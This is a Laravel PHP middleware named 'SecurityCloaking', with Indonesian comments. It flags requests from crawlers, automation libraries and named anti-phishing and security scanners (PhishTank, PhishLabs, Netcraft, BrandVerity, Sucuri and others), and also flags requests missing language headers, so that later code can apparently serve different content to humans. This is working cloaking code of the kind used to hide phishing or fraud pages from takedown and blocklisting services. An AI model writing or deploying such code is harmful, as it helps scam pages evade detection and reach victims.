<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class SecurityCloaking
{
public function handle(Request $request, Closure $next): Response
{
    $userAgent = strtolower($request->header('User-Agent', ''));
    $isBot = false;

    // 1. Daftar Bot Signals yang lebih lengkap
    $botSignals = [
        // Scanners & Security
        'googlebot', 'bingbot', 'crawler', 'spider', 'curl', 'wget', 
        'python', 'nikto', 'scan', 'headless', 'phishfort', 'phishlabs',
        'netcraft', 'phishtank', 'lookout', 'brandverity', 'sucuri', 
        'netsparker', 'censys', 'shodan', 'lighthouse', 'google-x-app',
        'virusdie', 'quttera', 'siteadvisor', 'drweb', 'comodo',
        
        // SEO & Tools
        'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot', 'rogerbot', 
        'yandexbot', 'baiduspider', 'ia_archiver',
        
        // Automation & Libraries
        'puppeteer', 'selenium', 'playwright', 'phantomjs', 'guzzlehttp',
        'axios', 'okhttp', 'java', 'libwww-perl', 'ruby', 'python-requests',
        
        // Social Media & Others
        'facebookexternalhit', 'twitterbot', 'linkedinbot', 'whatsapp', 
        'telegrambot', 'discordbot', 'uptimerobot', 'gtmetrix', 'pingdom'
    ];

    // 2. Cek User-Agent Kosong atau mengandung Sinyal Bot
    if (empty($userAgent)) {
        $isBot = true;
    } else {
        foreach ($botSignals as $signal) {
            if (str_contains($userAgent, $signal)) {
                $isBot = true;
                break;
            }
        }
    }

    // 3. FILTER MANUSIA: User asli pasti punya header bahasa & encoding
    // Bot scanner seringkali tidak mengirim header ini
    if (!$isBot) {
        if (!$request->hasHeader('Accept-Language') || !$request->hasHeader('Accept')) {
            $isBot = true;
        }
    }

    // Simpan status bot ke atribut request
    $request->attributes->set('is_bot', $isBot);

    return $next($request);
}
}